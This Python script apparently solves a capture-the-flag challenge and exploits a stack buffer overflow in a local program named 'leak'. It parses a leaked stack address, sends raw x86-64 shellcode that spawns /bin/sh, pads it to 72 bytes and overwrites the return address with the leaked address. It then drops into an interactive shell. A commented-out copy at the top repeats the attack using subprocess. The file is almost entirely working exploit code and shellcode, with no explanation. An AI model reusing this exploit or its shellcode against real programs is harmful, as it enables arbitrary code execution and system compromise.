#!/usr/bin/env python
#-*- coding: utf-8 -*-

# import re,sys,struct,subprocess
# p=subprocess.Popen("/home/leak",stdin=subprocess.PIPE,stdout=subprocess.PIPE,shell=True)
# Oops, I'm leaking! 0x7ffdc942a360
# Pwn me ¯\_(ツ)_/¯
# >
# line=p.stdout.readline()
# sys.stdout.write(line)
# addr=int(re.search(r"(0x[0-9a-f]+)",line).group(1),0x10)
# addr=struct.pack("<Q",addr)
# sys.stdout.write(p.stdout.readline())
# sys.stdout.write(p.stdout.read(2))
# p.stdin.write("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+addr+"\n")
# p.stdin.close()
# p.stdout.readline()

import re
import os
import sys
from pwn import *
if __name__ == "__main__":
	# r = process("./leak")
	r = process("/home/leak")
	resp = r.recvuntil("Pwn me")
	print>>sys.stderr, resp
	m = re.search(r"Oops, I'm leaking! (0x[0-9a-f]+)",resp)
	if m:
		addr = int(m.group(1),0x10)
		print>>sys.stderr, "0x%016x"%addr
		payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
		assert len(payload) <= 72
		payload += "A"*(72-len(payload))
		payload += p64(addr)
		r.sendline(payload)
		r.interactive()
	# r.close()
	# os._exit(0)
